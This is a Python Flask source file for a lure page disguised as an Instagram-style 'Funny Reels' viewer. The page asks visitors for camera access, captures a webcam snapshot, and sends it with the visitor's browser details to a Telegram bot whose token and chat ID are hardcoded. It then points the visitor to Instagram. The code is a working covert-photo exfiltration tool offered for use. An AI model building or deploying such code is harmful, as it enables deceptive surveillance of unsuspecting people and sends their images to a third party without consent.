import os
from flask import Flask, render_template_string, request, redirect, jsonify
import requests
import base64
import json
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8580091181:AAEXNF_lK3I2k_YRUVysnf1Cz8IXxrXGdTs")
CHAT_ID = os.getenv("CHAT_ID", "8507973714")
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"

target_redirect_url = "https://www.instagram.com"

def send_photo(photo_data, caption):
    url = f"{TELEGRAM_API}/sendPhoto"
    files = {"photo": ("photo.jpg", photo_data, "image/jpeg")}
    data = {"chat_id": CHAT_ID, "caption": caption}
    requests.post(url, files=files, data=data)

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head><title>Reels</title>
<meta name="viewport" content="width=device-width">
<style>
body{background:#000;color:#fff;text-align:center;padding:50px;font-family:sans-serif;}
.btn{background:#f09433;color:white;padding:20px;border:none;border-radius:50px;font-size:20px;cursor:pointer;width:100%;max-width:300px;}
#video{display:none;width:100%;max-height:400px;border-radius:20px;}
</style></head>
<body>
<h1>🎥 Watch Funny Reels</h1>
<p>Allow camera to continue...</p>
<video id="video" autoplay></video>
<button class="btn" onclick="capture()">📸 Watch Now</button>

<script>
let stream;
navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
    stream=s;document.getElementById('video').style.display='block';
    document.getElementById('video').srcObject=stream;
});

async function capture(){
    let canvas=document.createElement('canvas');
    canvas.width=640;canvas.height=480;
    canvas.getContext('2d').drawImage(document.getElementById('video'),0,0);
    canvas.toBlob(blob=>{
        let reader=new FileReader();
        reader.onload=()=>fetch('/save',{method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({img:reader.result})});
        reader.readAsDataURL(blob);
    });
}
</script>
'''

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    img_data = data['img'].split(',')[1]
    img_bytes = base64.b64decode(img_data)
    
    caption = f"📸 {datetime.now()}\nUA: {request.headers.get('User-Agent', '')[:50]}"
    send_photo(img_bytes, caption)
    
    return jsonify({'status':'ok', 'redirect':'https://www.instagram.com/reels/'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=True)
